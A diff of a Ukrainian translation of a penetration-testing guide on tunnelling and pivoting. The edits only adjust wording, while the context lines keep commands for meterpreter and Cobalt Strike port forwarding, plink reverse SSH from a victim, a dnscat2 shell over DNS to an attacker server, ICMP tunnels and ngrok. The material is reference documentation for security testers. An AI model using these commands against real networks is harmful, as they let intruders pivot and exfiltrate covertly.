@@ -5,7 +5,7 @@
 ## Nmap tip
 
 > [!WARNING]
-> **ICMP** та **SYN** сканування не можуть бути тунельовані через socks проксі, тому ми повинні **вимкнути пінг-дослідження** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
+> **ICMP** та **SYN** сканування не можуть бути тунельовані через проксі socks, тому ми повинні **вимкнути виявлення ping** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
 
 ## **Bash**
 
@@ -104,7 +104,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Локальний порт --> Скомпрометований хост (активна сесія) --> Третій_комп'ютер:Порт
+Локальний порт --> Скомпрометований хост (активна сесія) --> Третій_бокс:Порт
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -150,17 +150,17 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Щоб зауважити:
+Зверніть увагу:
 
-- Зворотний портовий переадресатор Beacon призначений для **тунелювання трафіку до Team Server, а не для пересилання між окремими машинами**.
+- Зворотний портовий переказ Beacon призначений для **тунелювання трафіку до Team Server, а не для пересилання між окремими машинами**.
 - Трафік **тунелюється в межах C2 трафіку Beacon**, включаючи P2P посилання.
-- **Привілеї адміністратора не потрібні** для створення зворотних портових переадресаторів на високих портах.
+- **Привілеї адміністратора не потрібні** для створення зворотних портових переказів на високих портах.
 
 ### rPort2Port локальний
 
 > [!WARNING]
-> У цьому випадку **порт відкривається на хості beacon**, а не на Team Server, і **трафік надсилається до клієнта Cobalt Strike** (не до Team Server), а звідти до вказаного хоста:порту.
-```
+> У цьому випадку **порт відкривається на хості beacon**, а не на Team Server, і **трафік надсилається до клієнта Cobalt Strike** (не до Team Server), а звідти до вказаного хосту:порту.
+```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
@@ -294,7 +294,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 ### SSL Socat Tunnel
 
-**/bin/sh консоль**
+**/bin/sh console**
 
 Створіть сертифікати з обох сторін: Клієнт і Сервер
 ```bash
@@ -322,7 +322,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Це як консольна версія PuTTY (опції дуже схожі на клієнт ssh).
 
-Оскільки цей бінар буде виконуватись на жертві і є клієнтом ssh, нам потрібно відкрити наш сервіс ssh і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
+Оскільки цей бінар буде виконуватись на жертві і є клієнтом ssh, нам потрібно відкрити наш ssh сервіс і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -346,7 +346,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Вам потрібно мати **доступ до RDP через систему**.\
 Завантажте:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP-з'єднання**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP з'єднання**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 На вашому клієнтському комп'ютері завантажте **`SocksOverRDP-Plugin.dll`** ось так:
@@ -360,7 +360,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Тепер підтвердіть на вашій машині (атакуючого), що порт 1080 слухає:
+Тепер підтвердіть на вашій машині (атакуючий), що порт 1080 слухає:
 ```
 netstat -antb | findstr 1080
 ```
@@ -368,7 +368,7 @@ netstat -antb | findstr 1080
 
 ## Проксування Windows GUI додатків
 
-Ви можете налаштувати Windows GUI додатки на використання проксі за допомогою [**Proxifier**](https://www.proxifier.com/).\
+Ви можете налаштувати Windows GUI додатки для роботи через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
 У **Профіль -> Проксі-сервери** додайте IP-адресу та порт SOCKS-сервера.\
 У **Профіль -> Правила проксування** додайте назву програми, яку потрібно проксувати, та з'єднання з IP-адресами, які ви хочете проксувати.
 
@@ -392,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Тепер, якщо ви налаштуєте, наприклад, на жертві сервіс **SSH** для прослуховування на порту 443. Ви можете підключитися до нього через порт атакуючого 2222.\
+Тепер, якщо ви налаштуєте, наприклад, на жертві службу **SSH** для прослуховування на порту 443. Ви можете підключитися до неї через порт атакуючого 2222.\
 Ви також можете використовувати **meterpreter**, який підключається до localhost:443, а атакуючий прослуховує на порту 2222.
 
 ## YARP
@@ -430,7 +430,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **У PowerShell**
 
-Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) для запуску клієнта dnscat2 у PowerShell:
+Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) для запуску клієнта dnscat2 у powershell:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -442,7 +442,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Зміна DNS у proxychains
 
-Proxychains перехоплює виклик `gethostbyname` libc і тунелює tcp DNS запит через socks проксі. За **замовчуванням** DNS сервер, який використовує proxychains, це **4.2.2.2** (жорстко закодований). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви в **середовищі Windows**, ви можете встановити IP **контролера домену**.
+Proxychains перехоплює виклик `gethostbyname` libc і тунелює tcp DNS запит через socks проксі. За **замовчуванням** DNS сервер, який використовує proxychains, є **4.2.2.2** (жорстко закодований). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви в **середовищі Windows**, ви можете встановити IP **контролера домену**.
 
 ## Тунелі в Go
 
@@ -455,7 +455,7 @@ Proxychains перехоплює виклик `gethostbyname` libc і тунел
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root потрібен в обох системах для створення tun адаптерів і тунелювання даних між ними за допомогою ICMP echo запитів.
+Для створення tun адаптерів і тунелювання даних між ними за допомогою ICMP echo запитів потрібен root доступ в обох системах.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **є інструментом для експонування рішень в Інтернеті в один рядок команди.**\
-_Експозиційні URI виглядають так:_ **UID.ngrok.io**
+_Експоновані URI виглядають так:_ **UID.ngrok.io**
 
 ### Встановлення
 
@@ -528,7 +528,7 @@ _Корисно для XSS, SSRF, SSTI ..._\
 Він відкриває 3 тунелі:
 
 - 2 TCP
-- 1 HTTP з статичними файлами з /tmp/httpbin/
+- 1 HTTP з експозицією статичних файлів з /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
